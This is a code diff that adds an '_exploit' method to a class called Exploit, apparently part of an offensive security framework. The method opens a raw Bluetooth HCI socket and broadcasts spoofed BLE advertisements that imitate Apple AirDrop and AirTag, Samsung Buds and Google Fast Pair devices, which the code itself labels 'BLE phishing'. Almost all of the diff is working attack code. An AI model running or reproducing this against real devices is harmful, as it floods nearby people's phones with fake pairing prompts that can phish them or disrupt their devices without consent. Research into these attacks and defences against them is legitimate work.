@@ -267,3 +267,47 @@ class Exploit(Exploit):
             self._run_beacon_hijack()
         elif self.mode == "notification_spam":
             self._run_name_spoof()
+
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E BLE phishing: raw HCI advertising with spoofed payload."""
+        import socket as _sock
+
+        print_status("BLE Phishing E2E: sending raw HCI advertising commands")
+        try:
+            hci_sock = _sock.socket(31, _sock.SOCK_RAW, 1)
+            dev_id = int(str(self.interface).replace("hci", "") or "0")
+            hci_sock.bind((dev_id,))
+        except OSError as exc:
+            print_info(f"HCI socket failed: {exc} (use hcitool manually)")
+            return
+
+        adv_map = {
+            "airdrop": self.APPLE_AIRDROP_ADV,
+            "airtag": self.APPLE_AIRTAG_ADV,
+            "samsung": self.SAMSUNG_BUDS_ADV,
+            "google": self.GOOGLE_FASTPAIR_ADV,
+        }
+        payload = adv_map.get(str(self.spoof_type), self.APPLE_AIRDROP_ADV)
+
+        adv_data_padded = payload[:31] + b"\x00" * max(0, 31 - len(payload))
+        set_data_param = struct.pack("B", min(len(payload), 31)) + adv_data_padded
+        opcode_data = struct.pack("<H", 0x2008)
+        hci_set_adv_data = opcode_data + struct.pack("B", len(set_data_param)) + set_data_param
+
+        opcode_enable = struct.pack("<H", 0x200A)
+        hci_enable = opcode_enable + struct.pack("BB", 1, 0x01)
+
+        for label, cmd in [("Set Adv Data", hci_set_adv_data), ("Enable Adv", hci_enable)]:
+            pkt = struct.pack("B", 0x01) + cmd
+            try:
+                hci_sock.send(pkt)
+                print_status(f"Sent HCI {label} ({len(pkt)} bytes)")
+            except OSError as exc:
+                print_error(f"Failed {label}: {exc}")
+                hci_sock.close()
+                return
+
+        hci_sock.close()
+        print_success(f"BLE phishing advertising active ({self.spoof_type})")
